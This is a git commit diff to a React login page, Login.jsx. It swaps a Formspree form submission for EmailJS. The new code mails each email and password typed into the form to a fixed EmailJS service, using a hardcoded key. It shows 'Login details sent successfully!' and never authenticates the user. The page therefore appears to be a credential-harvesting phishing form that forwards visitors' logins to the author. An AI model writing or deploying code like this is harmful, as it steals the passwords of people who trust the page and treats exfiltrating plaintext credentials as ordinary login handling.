2061fa9254ff9137f11df78bd7cf3b861d41b13f
Leroii-Wess <roywesley33@gmail.com>
2024-11-24 01:38:19 +0100

    mailing

--- src/pages/Login.jsx
+++ src/pages/Login.jsx
@@ -1,180 +1,18 @@
-// import usePasswordToggle from "../hooks/usePasswordToggle";
-// import { useFormik } from "formik";
-// import { useForm } from "@formspree/react";
-
-// import * as Yup from "yup";
-// import { useNavigate } from "react-router-dom";
-// import toast from "react-hot-toast";
-// import SpinnerMini from "../ui/SpinnerMini";
-// import { Link } from "react-router-dom";
-
-// const Login = () => {
-//   const [PasswordInputType, ToggleIcon] = usePasswordToggle();
-//   const navigate = useNavigate();
-//   const [state, handleSubmit] = useForm("xwpkqdob");
-//   console.log(state);
-
-//   // Validation for input data
-//   const validate = Yup.object({
-//     email: Yup.string()
-//       .email("Please enter a valid email")
-//       .required("Required"),
-//     password: Yup.string()
-//       .min(6, "Password must be at least 6 characters")
-//       .required("Required"),
-//   });
-
-//   // Form Submission
-//   const handleFormSubmit = async (values, actions) => {
-//     try {
-//       await new Promise((resolve) => setTimeout(resolve, 3000));
-
-//       if (state.succeeded) {
-//         toast.success("Logged in successfully");
-//         navigate("/home");
-//       }
-
-//       return;
-//     } catch (err) {
-//       toast.error("Wrong credentials, enter correct email and password");
-//       console.log(err);
-//     } finally {
-//       actions.resetForm();
-//     }
-//   };
-
-//   const { values, errors, touched, handleBlur, handleChange } = useFormik({
-//     initialValues: {
-//       email: "",
-//       password: "",
-//     },
-//     validationSchema: validate,
-//     onSubmit: handleFormSubmit,
-//   });
-
-//   return (
-//     <div className="relative flex items-center justify-center min-h-screen bg-blue-500">
-//       <div
-//         className={`absolute inset-0 bg-cover bg-center bg-[url("src/assets/Shape.png")]`}
-//       ></div>
-//       <div className="z-10 bg-white p-20 rounded-2xl shadow-lg w-full max-w-2xl flex flex-col gap-4">
-//         <h2 className="text-4xl text-gray-700 font-bold mb-2 text-center">
-//           Login to Account
-//         </h2>
-//         <p className="text-gray-600 text-center text-xl mb-6">
-//           Please enter your email and password to continue
-//         </p>
-
-//         <form
-//           onSubmit={handleSubmit}
-//           action="https://formspree.io/f/xwpkqdob"
-//           method="POST"
-//           className="flex flex-col gap-8"
-//         >
-//           {/* Email Input */}
-//           <div>
-//             <label
-//               htmlFor="email"
-//               className="block text-gray-700 font-medium text-2xl mb-1"
-//             >
-//               Email
-//             </label>
-//             <input
-//               id="email"
-//               type="email"
-//               name="email"
-//               value={values.email}
-//               onChange={handleChange}
-//               onBlur={handleBlur}
-//               className={`${
-//                 errors.email && touched.email ? " border-red-400" : ""
-//               } w-full px-4 py-3 text-2xl rounded-lg bg-gray-50 focus:outline-none  placeholder:text-xl`}
-//               placeholder="Enter your email"
-//             />
-//             {errors.email && touched.email && (
-//               <span className="text-xl text-red-500">{errors.email}</span>
-//             )}
-//           </div>
-
-//           {/* Password Input */}
-//           <div className="relative">
-//             <label
-//               htmlFor="password"
-//               className="block text-gray-700 font-medium text-2xl mb-1"
-//             >
-//               Password
-//             </label>
-//             <input
-//               id="password"
-//               name="password"
-//               type={PasswordInputType}
-//               value={values.password}
-//               onChange={handleChange}
-//               onBlur={handleBlur}
-//               className={`${
-//                 errors.password && touched.password
-//                   ? "border-red-400 focus:ring-red-400"
-//                   : ""
-//               } w-full px-4 py-3 text-2xl  rounded-lg bg-gray-50 focus:outline-none  placeholder:text-xl`}
-//               placeholder="Enter your password"
-//             />
-
-//             <span
-//               className={`${
-//                 errors.password && touched.password ? "bottom-[5.4rem]" : ""
-//               } absolute right-4 bottom-12 flex items-center cursor-pointer text-2xl`}
-//             >
-//               {ToggleIcon}
-//             </span>
-
-//             {errors.password && touched.password && (
-//               <span className="text-xl text-red-500">{errors.password}</span>
-//             )}
-
-//             <div className="flex justify-end mt-1">
-//               <Link to="#" className="text-xl text-blue-500 hover:underline">
-//                 Forgot Password?
-//               </Link>
-//             </div>
-//           </div>
-
-//           {/* Login Button */}
-//           <div className="flex items-center justify-center">
-//             <button
-//               type="submit"
-//               disabled={state.submitting}
-//               className={`${
-//                 state.submitting ? "opacity-70" : ""
-//               } w-3/4 flex items-center justify-center bg-blue-600 text-white font-bold py-3 px-4 rounded-lg hover:bg-blue-700 transition duration-300`}
-//             >
-//               {state.submitting ? <SpinnerMini /> : "Sign In"}
-//             </button>
-//           </div>
-//         </form>
-//       </div>
-//     </div>
-//   );
-// };
-
-// export default Login;
-
-import usePasswordToggle from "../hooks/usePasswordToggle";
+import { useRef } from "react";
 import { useFormik } from "formik";
-import { useForm } from "@formspree/react";
-
 import * as Yup from "yup";
-import { useNavigate } from "react-router-dom";
 import toast from "react-hot-toast";
-import SpinnerMini from "../ui/SpinnerMini";
-import { Link } from "react-router-dom";
+import { Link, useNavigate } from "react-router-dom";
 import bg from "../images/Shape.png";
+import emailjs from "@emailjs/browser";
+
+const PUBLIC_KEY = "N9N2FNrtWhrVPSr0C";
 
 const Login = () => {
-  const [PasswordInputType, ToggleIcon] = usePasswordToggle();
   const navigate = useNavigate();
-  const [state, handleSubmit] = useForm("xwpkqdob");
+  const formRef = useRef();
 
-  // Validation for input data
+  // Formik validation schema
   const validate = Yup.object({
     email: Yup.string()
       .email("Please enter a valid email")
@@ -192,20 +30,19 @@ const Login = () => {
     validationSchema: validate,
     onSubmit: async (values, actions) => {
       try {
-        await new Promise((resolve) => setTimeout(resolve, 3000)); // Simulating delay
-
-        await handleSubmit({
-          data: {
-            email: values.email,
-            password: values.password,
-          },
-        });
-
-        toast.success("Logged in successfully");
+        await emailjs.sendForm(
+          "service_jwb7x8t",
+          "login_form",
+          formRef.current,
+          {
+            publicKey: PUBLIC_KEY,
+          }
+        ); // Replace with your service and template IDs
+        toast.success("Login details sent successfully!");
         navigate("/home");
       } catch (err) {
-        toast.error("Something went wrong");
-        console.error(err);
+        toast.error("Failed to send login details.");
+        console.error("EmailJS Error:", err);
       } finally {
         actions.setSubmitting(false);
         actions.resetForm();
@@ -231,7 +68,11 @@ const Login = () => {
           Please enter your email and password to continue
         </p>
 
-        <form onSubmit={formik.handleSubmit} className="flex flex-col gap-8">
+        <form
+          onSubmit={formik.handleSubmit}
+          ref={formRef}
+          className="flex flex-col gap-8"
+        >
           {/* Email Input */}
           <div>
             <label
@@ -251,7 +92,7 @@ const Login = () => {
                 formik.errors.email && formik.touched.email
                   ? " border-red-400"
                   : ""
-              } w-full px-4 py-3 text-2xl rounded-lg bg-gray-50 focus:outline-none  placeholder:text-xl`}
+              } w-full px-4 py-3 text-2xl rounded-lg bg-gray-50 focus:outline-none placeholder:text-xl`}
               placeholder="Enter your email"
             />
             {formik.errors.email && formik.touched.email && (
@@ -262,7 +103,7 @@ const Login = () => {
           </div>
 
           {/* Password Input */}
-          <div className="relative">
+          <div>
             <label
               htmlFor="password"
               className="block text-gray-700 font-medium text-2xl mb-1"
@@ -272,7 +113,7 @@ const Login = () => {
             <input
               id="password"
               name="password"
-              type={PasswordInputType}
+              type="password"
               value={formik.values.password}
               onChange={formik.handleChange}
               onBlur={formik.handleBlur}
@@ -280,14 +121,9 @@ const Login = () => {
                 formik.errors.password && formik.touched.password
                   ? "border-red-400 focus:ring-red-400"
                   : ""
-              } w-full px-4 py-3 text-2xl  rounded-lg bg-gray-50 focus:outline-none  placeholder:text-xl`}
+              } w-full px-4 py-3 text-2xl  rounded-lg bg-gray-50 focus:outline-none placeholder:text-xl`}
               placeholder="Enter your password"
             />
-
-            <span className="absolute right-4 bottom-12 flex items-center cursor-pointer text-2xl">
-              {ToggleIcon}
-            </span>
-
             {formik.errors.password && formik.touched.password && (
               <span className="text-xl text-red-500">
                 {formik.errors.password}
@@ -305,16 +141,12 @@ const Login = () => {
           <div className="flex items-center justify-center">
             <button
               type="submit"
-              disabled={formik.isSubmitting || state.submitting}
+              disabled={formik.isSubmitting}
               className={`${
-                formik.isSubmitting || state.submitting ? "opacity-70" : ""
+                formik.isSubmitting ? "opacity-70" : ""
               } w-3/4 flex items-center justify-center bg-blue-600 text-white font-bold py-3 px-4 rounded-lg hover:bg-blue-700 transition duration-300`}
             >
-              {formik.isSubmitting || state.submitting ? (
-                <SpinnerMini />
-              ) : (
-                "Sign In"
-              )}
+              {formik.isSubmitting ? "Submitting..." : "Sign In"}
             </button>
           </div>
         </form>
